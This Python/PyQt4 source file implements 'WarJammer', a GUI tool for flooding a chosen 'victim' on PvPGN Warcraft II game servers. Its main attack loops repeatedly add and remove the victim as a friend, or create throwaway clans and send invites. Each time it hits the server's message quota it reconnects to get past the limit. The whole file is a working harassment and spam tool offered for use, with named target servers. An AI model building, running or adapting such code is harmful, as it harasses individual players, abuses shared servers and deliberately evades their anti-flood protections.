from PyQt4 import QtGui
import sys
import socket
import string
import random
import ui
from PyQt4.QtCore import QThread, SIGNAL

class attack(QThread):
    def __init__(self, username, password, server, attack_mode, victim, clan_name):

        print 'attack.__init__()'

        # This is the class that all attack thread objects will be formed from

        QThread.__init__(self)
        self.username = str(username)
        self.password = str(password)
        self.server = str(server)
        self.attack_mode = attack_mode
        self.victim = victim
        self.clan_name = str(clan_name)
        self.login_attempts = 0

    def __del__(self):

        print 'attack.__del__()'

        self.wait()

    def check_login_creds(self):

        print 'attack.check_login_creds()\n'

        while True:

            self.connection_status = 0

            try:
                self.buffer_size = 2048
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server, 6112))
                self.s.setblocking(0)
                self.s.settimeout(10)

                self.s.send("\r\n")

                self.s.send(self.username)
                self.s.send("\r\n")

                self.s.send(self.password)
                self.s.send("\r\n")

                total_data = [];
                data = ''
                while True:
                    data = self.s.recv(8192)
                    if 'Joining channel:' in data or 'Login failed.' in data:
                        total_data.append(data)
                        break
                    total_data.append(data)
                    if len(total_data) > 1:
                        # check if end_of_data was split
                        last_pair = total_data[-2] + total_data[-1]
                        if 'Joining channel:' in last_pair:
                            total_data[-2] = last_pair[:last_pair.find('Joining channel:')]
                            total_data.pop()
                            break
                data = ''.join(total_data)

                print 'WARJAMMER DEBUG: attack.check_login_creds() Output -----'
                print data
                print '--------------------------------------------------'

                if "failed" in data:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Login failed', 'red')
                    self.emit(SIGNAL('done(QString)'), 'no')
                    return

                elif "no bot" in data:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Server not supported', 'red')
                    self.emit(SIGNAL('done(QString)'), 'no')
                    return

                elif "Your unique name:" in data:
                    self.connection_status = 1
                    self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Connected', 'light gray')
                    return

                else:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Received invalid response', 'red')
                    self.s.close()
                    continue

            except Exception as e:
                print 'WarJammer Debug: attack.check_login_creds() Socket Error -----'
                print e
                print '--------------------------------------------------------'
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'No reply from server', 'red')
                self.emit(SIGNAL('done(QString)'), 'no')
                self.connection_status = 0
                return

    def pvpgn_login(self):

        print 'attack.pvpgn_login()\n'

        while True:

            self.connection_status = 0

            try:
                self.buffer_size = 2048
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server, 6112))
                self.s.setblocking(0)
                self.s.settimeout(10)

                self.s.send("\r\n")

                self.s.send(self.username)
                self.s.send("\r\n")

                self.s.send(self.password)
                self.s.send("\r\n")

                total_data = [];
                data = ''
                while True:
                    data = self.s.recv(8192)
                    if 'Joining channel:' in data or 'Login failed.' in data:
                        total_data.append(data)
                        break
                    total_data.append(data)
                    if len(total_data) > 1:
                        # check if end_of_data was split
                        last_pair = total_data[-2] + total_data[-1]
                        if 'Joining channel:' in last_pair:
                            total_data[-2] = last_pair[:last_pair.find('Joining channel:')]
                            total_data.pop()
                            break
                data = ''.join(total_data)

                print 'WARJAMMER DEBUG: attack.pvpgn_login() Output -----'
                print data
                print '--------------------------------------------------'

                if "failed" in data:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Login failed', 'red' )
                    continue

                elif "no bot" in data:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Server not supported', 'red' )
                    self.emit(SIGNAL('done(QString)'), 'no')
                    return

                elif "Your unique name:" in data:
                    self.connection_status = 1
                    self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Connected', 'light gray' )
                    return

                else:
                    self.connection_status = 0
                    self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Received invalid response', 'red' )
                    self.s.close()
                    continue

            except Exception as e:
                print 'WarJammer Debug: attack.pvpgn_login() Socket Error -----'
                print e
                print '--------------------------------------------------------'
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'No reply from server', 'red')
                self.emit(SIGNAL('done(QString)'), 'no')
                self.connection_status = 0
                return

    def random_clan_tag(self, str_size=6, chars=string.ascii_uppercase + string.digits):
        print 'attack.random_clan_tag()'
        return ''.join(random.choice(chars) for _ in range(str_size))

    def fl_attack(self):

        print 'attack.fl_attack()'

        self.attack_number = 0

        while True:
            self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Friend List Attack started', 'green')

            self.s.send("/whois %s" %self.victim)
            self.s.send("\r\n")

            self.s.send("/f a %s" %self.victim)
            self.s.send("\r\n")

            self.s.send("/f r %s" %self.victim)
            self.s.send("\r\n")

            total_data = [];
            data = ''
            while True:
                data = self.s.recv(8192)
                if 'from your' in data or "quota has been exceeded!" in data or 'not exist.' in data:
                    total_data.append(data[:data.find('from your')])
                    break
                total_data.append(data)
                if len(total_data) > 1:
                    # check if end_of_data was split
                    last_pair = total_data[-2] + total_data[-1]
                    if 'from your' in last_pair:
                        total_data[-2] = last_pair[:last_pair.find('from your')]
                        total_data.pop()
                        break
            data = ''.join(total_data)

            # Data Filters:'<from' and '>' prevent against whispers and in channel text being read as server input.
            # Previously a user could whisper or say 'offline' for example and the bot would log off.
            # Order of if statements is important here, the data might include text that matches multiple filters

            if "<from" in data:

                # TODO: This data contains a msg whispered to the bot. Might want to log this to a text file or display
                # output somehwere later

                continue

            elif ">" in data:

                # This is a msg from another user in the same chat channel. Probably not important

                continue

            # elif flooding:

            elif "ERROR: Your message quota has been exceeded!" in data:
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    self.s.close()
                    break

            elif "offline" in data:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'User is offline', 'red' )
                self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Message send failed',
                          'light gray')
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    self.s.close()
                    break

            elif "Unknown" in data:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'User does not exist', 'red' )
                self.emit(SIGNAL('done(QString)'), 'no')
                break

            elif "is already on your" in data:
                self.s.send("/f r %s" % self.victim)
                self.s.send("\r\n")
                continue

            # Desired outcome

            elif "Added" in data:
                self.attack_number = self.attack_number + 1
                self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Sent message #' + str(self.attack_number), 'light gray' )
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    break

            else:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Received invalid response', 'red' )
                self.emit(SIGNAL('done(QString)'), 'no')
                break

    def ci_attack(self):

        print 'attack.ci_attack()'

        self.attack_number = 0

        while True:

            self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Clan Invite Attack started', 'green')
            self.clan_tag = self.random_clan_tag()

            self.s.send("/clan create %s %s" % (self.clan_tag, self.clan_name))
            self.s.send("\r\n")

            self.s.send("/clan invite %s" % self.victim)
            self.s.send("\r\n")

            total_data = [];
            data = ''
            while True:
                data = self.s.recv(8192)
                if 'to your clan!' in data or "is already member of clan!" in data or "quota has been exceeded!" in data or "a clan!" in data:
                    total_data.append(data)
                    break
                total_data.append(data)
                if len(total_data) > 1:
                    # check if end_of_data was split
                    last_pair = total_data[-2] + total_data[-1]
                    if 'to your clan!' in last_pair:
                        total_data[-2] = last_pair[:last_pair.find('to your clan!')]
                        total_data.pop()
                        break
            data = ''.join(total_data)


            # Data Filters:'<from' and '>' prevent against whispers and in channel text being read as server input.
            # Previously a user could whisper or say 'You are not in' for example and the bot would log off.
            # Order of if statements is important here, the data might include text that matches multiple filters


            if "<from" in data:
                print 'WARJAMMER DEBUG: Msg whispered to bot'
                self.s.send("/clan disband yes")
                self.s.send("\r\n")

                # TODO: This data contains a msg whispered to the bot. Might want to log this to a text file or display
                # output somehwere later

                continue

           # elif ">" in data and "<username>" not in data:
           # This case is catching msgs that are sent inside the chat channel, while filtering out <username> which is
           # expected output of some of the /clan commands

            elif ">" in data and "<username>" not in data:
                print 'WARJAMMER DEBUG: Msg in chat'
                self.s.send("/clan disband yes")
                self.s.send("\r\n")
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    break

            # Check if clan creation is supported:

            elif "You are not in" in data:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Server does not support clans','red')
                self.emit(SIGNAL('done(QString)'), 'no')
                break

            # Woops, the spambot is already in a clan so it can't create a new one. Lets disband the current clan and
            # try again:

            elif "You are already in clan" in data:
                print 'WARJAMMER DEBUG: Already in a clan'
                self.s.send("/clan disband yes")
                self.s.send("\r\n")
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    break

            # Yes, there is an antidote for this attack, join a clan and WarJammer can't attack you:

            elif " is not online or is already member of clan!" in data:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'User is already in a clan or offline','red')
                self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Invite send failed',
                          'light gray')
                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    self.s.close()
                    break

            # 'Please choice another one.' Lol yes this is not a mistake, typo is still in latest version of PvPGN. This
            # means that the clan already exists, so this would only trigger if somehow the randomly generated clan tag
            # matched an existing one (unlikely but possible). So generate new random tag and try again:

            elif "Please choice another one." in data:
                print 'WARJAMMER DEBUG: Clan tag already in use'

                self.clan_tag = self.random_clan_tag()

                self.s.send("/clan disband yes")
                self.s.send("\r\n")
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    break

            # Just in case the developers fix the spelling, but it is still 'choice' as of PvPGN 1.99.7-PRO

            elif "Please choose another one." in data:
                print 'WARJAMMER DEBUG: Clan tag already in use'
                self.clan_tag = self.random_clan_tag()

                self.s.send("/clan disband yes")
                self.s.send("\r\n")

                self.s.close()
                self.pvpgn_login()
                if self.connection_status == 1:
                    continue
                else:
                    break

            # Desired outcome:

            elif "was invited" in data:
                self.attack_number = self.attack_number + 1
                self.emit(SIGNAL('catch_status_msg(QString, QString)'), 'Sent invite #' + str(self.attack_number), 'light gray' )
                self.s.send("/clan disband yes")
                self.s.send("\r\n")
                self.s.close()
                self.pvpgn_login()
                print 'WARJAMMER DEBUG: self.connection_status == ' + str(self.connection_status)
                if self.connection_status == 1:
                    continue
                else:
                    break

            # elif flooding:

            elif "quota has been exceeded!" in data:
                print 'WARJAMMER DEBUG: Disc for flooding'
                self.s.send("/clan disband yes")
                self.s.send("\r\n")
                self.s.close()
                self.pvpgn_login()
                print 'WARJAMMER DEBUG: self.connection_status == ' + str(self.connection_status)
                if self.connection_status == 1:
                    continue
                else:
                    self.s.close()
                    break

            else:
                self.emit(SIGNAL('catch_status_msg_2(QString, QString)'), 'Received invalid response', 'red')
                self.emit(SIGNAL('done(QString)'), 'no')
                self.s.close()
                break



    def run(self):
            print 'attack.run()'
            # Check login creds, then if login is successful, start the usual login function, figure out what attack to
            # launch, then launch attack
            self.check_login_creds()
            if self.connection_status == 1:
                self.pvpgn_login()
                if self.connection_status == 1:
                    if self.attack_mode == 0:
                        self.fl_attack()
                    elif self.attack_mode == 1:
                        self.ci_attack()


class WarJammer(QtGui.QMainWindow, ui.Ui_MainWindow):
    def __init__(self):
        print 'WarJammer.__init__()'
        # super allows us to access variables, methods etc in the ui.py file
        super(self.__class__, self).__init__()
        self.setupUi(self)  # This is defined in ui.py file automatically
        # It sets up layout and widgets that are defined
        # Link Attack button to WarJammer.start_attack function
        self.button_attack.clicked.connect(self.start_attack)
        # Link all inputs to WarJammer.start_attack function (if enter is hit while inside input)
        self.input_username.returnPressed.connect(self.start_attack)
        self.input_password.returnPressed.connect(self.start_attack)
        self.input_victim.returnPressed.connect(self.start_attack)
        self.input_clan_name.returnPressed.connect(self.start_attack)

        self.disable_button_check()

        # If new server is picked from dropdown, run function to check if one of the attacks need to be disabled:
        self.input_server.currentIndexChanged.connect(self.disable_button_check)

        # If a radio button is toggled, run a function to either hide or unhide the Clan Name input
        self.radio_friend_list.toggled.connect(self.radio_friend_list_clicked)
        self.radio_clan_invite.toggled.connect(self.radio_clan_invite_clicked)
        # Set max length for Clan Name input to 23, the max chars PvPGN will allow
        self.input_clan_name.setMaxLength(23)

    def radio_friend_list_clicked(self):

        print 'WarJammer.radio_friend_list_clicked()'

        if self.radio_friend_list.isChecked():
            self.input_clan_name.setVisible(False)

    def radio_clan_invite_clicked(self):

        print 'WarJammer.radio_clan_invite_clicked()'

        if self.radio_clan_invite.isChecked():
            self.input_clan_name.setVisible(True)

    def disable_button_check(self):

        print 'WarJammer.disable_button_check()'

        if str(self.input_server.currentText()) == 'server.war2.ru':
            self.input_clan_name.setVisible(True)
            self.radio_clan_invite.setDisabled(False)
            self.radio_friend_list.setDisabled(True)
            self.radio_clan_invite.setChecked(1)
            self.radio_friend_list.setChecked(0)

        elif str(self.input_server.currentText()) == 'server.war2.me':
            self.input_clan_name.setVisible(False)
            self.radio_clan_invite.setDisabled(True)
            self.radio_friend_list.setDisabled(False)
            self.radio_clan_invite.setChecked(0)
            self.radio_friend_list.setChecked(1)

        elif str(self.input_server.currentText()) == 'backup.war2.me':
            self.input_clan_name.setVisible(False)
            self.radio_clan_invite.setDisabled(True)
            self.radio_friend_list.setDisabled(False)
            self.radio_clan_invite.setChecked(0)
            self.radio_friend_list.setChecked(1)

        else:
            self.input_clan_name.setVisible(False)
            self.radio_clan_invite.setDisabled(False)
            self.radio_friend_list.setDisabled(False)
            self.radio_clan_invite.setChecked(0)
            self.radio_friend_list.setChecked(1)

    def start_attack(self):
        print 'WarJammer.start_attack()'
        # Connect all the inputs to the 'Stop' function (self.done('yes')) now that the attack has started. instead of
        # the 'Attack' function:
        self.input_username.returnPressed.disconnect()
        self.input_username.returnPressed.connect(lambda: self.done('yes'))
        self.input_password.returnPressed.disconnect()
        self.input_password.returnPressed.connect(lambda: self.done('yes'))
        self.input_victim.returnPressed.disconnect()
        self.input_victim.returnPressed.connect(lambda: self.done('yes'))
        self.input_clan_name.returnPressed.disconnect()
        self.input_clan_name.returnPressed.connect(lambda: self.done('yes'))

        # Gather and assign all the user input:
        self.victim = self.input_victim.text()
        self.clan_name = self.input_clan_name.text()
        self.friend_list_attack = self.radio_friend_list.isChecked()
        self.clan_invite_attack = self.radio_clan_invite.isChecked()
        self.server = str(self.input_server.currentText())
        self.username = str(self.input_username.text())
        self.password = str(self.input_password.text())

        # Check which attack mode and assign binary val to self.attack_mode
        # 0 = Friend List Atack
        # 1 = Clan Invite Attack

        if self.friend_list_attack == 1:
            self.attack_mode = 0
        elif self.clan_invite_attack == 1:
            self.attack_mode = 1

        # Validate user input/check for missing params
        if not self.username or not self.password:
            self.label_status_msg_2.setText("Username/Password missing")
            self.label_status_msg_2.setStyleSheet('color: red')
            self.button_attack.clicked.disconnect()
            self.button_attack.clicked.connect(self.start_attack)
            self.button_attack.setText("Attack")
            return

        if not self.victim:
            self.button_attack.clicked.disconnect()
            self.button_attack.clicked.connect(self.start_attack)
            self.button_attack.setText("Attack")
            self.label_status_msg_2.setText("Victim Username missing")
            self.label_status_msg_2.setStyleSheet('color: red')
            return

        if self.radio_clan_invite.isChecked():
            if not self.clan_name:
                self.button_attack.clicked.disconnect()
                self.button_attack.clicked.connect(self.start_attack)
                self.button_attack.setText("Attack")
                self.label_status_msg_2.setText("Clan Name missing")
                self.label_status_msg_2.setStyleSheet('color: red')
                return

        if self.victim == self.username:
            self.button_attack.clicked.disconnect()
            self.button_attack.clicked.connect(self.start_attack)
            self.button_attack.setText("Attack")
            self.label_status_msg_2.setText("You can't attack yourself")
            self.label_status_msg_2.setStyleSheet('color: red')
            return

        # Create attack object
        self.get_thread = attack(self.username, self.password, self.server, self.attack_mode, self.victim, self.clan_name)

        # Setup signals to listen for and connect them to functions
        self.connect(self.get_thread, SIGNAL("catch_status_msg(QString, QString)"), self.catch_status_msg)
        self.connect(self.get_thread, SIGNAL("catch_status_msg_2(QString, QString)"), self.catch_status_msg_2)
        self.connect(self.get_thread, SIGNAL("done(QString)"), self.done)

        # Start attack thread
        self.get_thread.start()

        # Change 'Attack' button to 'Stop' button, update status msg
        self.button_attack.clicked.disconnect()
        self.button_attack.clicked.connect(lambda: self.done('yes'))
        self.button_attack.setText("Stop")
        self.label_status_msg_2.setText("")
        self.label_status_msg.setText("Connecting...")
        self.label_status_msg.setStyleSheet('color: light gray')

    def catch_status_msg(self, msg, color):

        print 'WarJammer.catch_status_msg()'

        self.label_status_msg.setText(msg)
        self.label_status_msg.setStyleSheet('color: ' + color)

    def catch_status_msg_2(self, msg, color):

        print 'WarJammer.catch_status_msg_2()'

        self.label_status_msg_2.setText(msg)
        self.label_status_msg_2.setStyleSheet('color: ' + color)

    # This function kills the thread, but deals with it differently depending on whether it was stopped by the user
    # ('Stop' button) --  aka button_pressed='yes', or if the process finished/crashed out -- aka button_pressed='no'

    def done(self, button_pressed):

        print 'WarJammer.done()'

        if button_pressed == 'yes':
            # Set all the inputs to respond to 'Enter' key as 'Attack' function now instead of 'Stop'
            self.input_username.returnPressed.disconnect()
            self.input_username.returnPressed.connect(self.start_attack)
            self.input_password.returnPressed.disconnect()
            self.input_password.returnPressed.connect(self.start_attack)
            self.input_victim.returnPressed.disconnect()
            self.input_victim.returnPressed.connect(self.start_attack)
            self.input_clan_name.returnPressed.disconnect()
            self.input_clan_name.returnPressed.connect(self.start_attack)

            try:
                self.get_thread.s.send("/logout")
                self.get_thread.s.send("\r\n")
                self.get_thread.s.close()
            except:
                pass

            self.get_thread.quit()

            # Set button back to 'Attack', reset status messages
            self.msg_2 = self.label_status_msg_2.text()
            self.button_attack.clicked.disconnect()
            self.button_attack.clicked.connect(self.start_attack)
            self.button_attack.setText("Attack")
            self.label_status_msg_2.setText("")
            self.label_status_msg_2.setStyleSheet('color: light gray')
            self.label_status_msg.setText("Not Connected")
            self.label_status_msg.setStyleSheet('color: light gray')

        elif button_pressed == 'no':
            # Set all the inputs to respond to 'Enter' key as 'Attack' function now instead of 'Stop'
            self.input_username.returnPressed.disconnect()
            self.input_username.returnPressed.connect(self.start_attack)
            self.input_password.returnPressed.disconnect()
            self.input_password.returnPressed.connect(self.start_attack)
            self.input_victim.returnPressed.disconnect()
            self.input_victim.returnPressed.connect(self.start_attack)
            self.input_clan_name.returnPressed.disconnect()
            self.input_clan_name.returnPressed.connect(self.start_attack)

            try:
                self.get_thread.s.send("/logout")
                self.get_thread.s.send("\r\n")
                self.get_thread.s.close()
            except:
                pass

            self.get_thread.quit()

            # Set button back to 'Attack', reset status messages, but leave error msg if exists (for example, an
            # 'Invalid Username/Password' msg

            self.msg_2 = self.label_status_msg_2.text()
            self.button_attack.clicked.disconnect()
            self.button_attack.clicked.connect(self.start_attack)
            self.button_attack.setText("Attack")

            # Clear 'attack started' message if exists, else leave the error msg for user to see
            if 'Attack' in self.msg_2:
                self.label_status_msg_2.setText("")
                self.label_status_msg_2.setStyleSheet('color: light gray')

            self.label_status_msg.setText("Not Connected")
            self.label_status_msg.setStyleSheet('color: light gray')

def main():
    app = QtGui.QApplication(sys.argv)  # A new instance of QApplication
    form = WarJammer()  # Set the form to be WarJammer (ui.py)
    form.show()  # Show the form
    app.exec_()  # Execute the app


if __name__ == '__main__':  # if running this file directly and not importing it
    main()  # run the main function